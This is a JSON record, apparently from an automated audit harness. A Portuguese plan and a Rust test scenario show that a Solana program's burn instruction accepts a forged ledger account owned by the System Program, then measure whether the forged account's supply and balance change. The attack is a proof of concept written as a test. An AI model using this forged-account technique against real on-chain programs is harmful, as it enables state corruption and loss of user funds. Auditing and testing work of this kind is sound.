attempts.raw:
{
  "plan": "O ataque explora a ausência de verificação de owner na instrução burn. O baseline usa uma conta ledger legítima (owner = program_id) com supply e balance válidos, e o burn reduz ambos. O ataque fornece uma conta forjada com owner diferente (System Program) e os mesmos bytes 40..56, mas com saldo suficiente para o burn. Se a instrução aceitar a conta forjada, ela gravará os novos valores nessa conta, demonstrando a corrupção de estado arbitrário. O efeito medido é que a conta forjada teve seus bytes 40..56 alterados, o que não ocorreria se o owner fosse verificado.",
  "scenario": "let program_id = env.program_id;

// Conta ledger legítima: owner = program_id, dados com supply=1000, balance=500 nos offsets 40..56
let mut legit_data = vec![0u8; 56];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_ledger = account(&program_id, &legit_data, None);

// Conta forjada: owner = System Program, mesmos dados iniciais
let mut forged_data = vec![0u8; 56];
forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);

// Instrução burn: IX_BURN = 3, amount = 100
let mut ix_data = vec![3u8];
ix_data.extend_from_slice(&100u64.to_le_bytes());

// Baseline: burn na conta legítima (deve ter sucesso)
let ix_legit = env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);
let baseline_result = env.baseline("burn legítimo", &ix_legit, &[legit_ledger.clone()]);

// Ataque: burn na conta forjada (owner diferente)
let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);
let attack_result = env.attack("burn em conta forjada", &ix_attack, &[forged_ledger.clone()]);

// Efeito: se o ataque teve sucesso, a conta forjada deve ter sido modificada
if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &solana_sdk::system_program::id());
    let new_supply = read_u64(forged_after.data(), 40);
    let new_balance = read_u64(forged_after.data(), 48);
    env.effect("supply da conta forjada foi reduzido para 900", new_supply == 900);
    env.effect("balance da conta forjada foi reduzido para 400", new_balance == 400);
}"
}

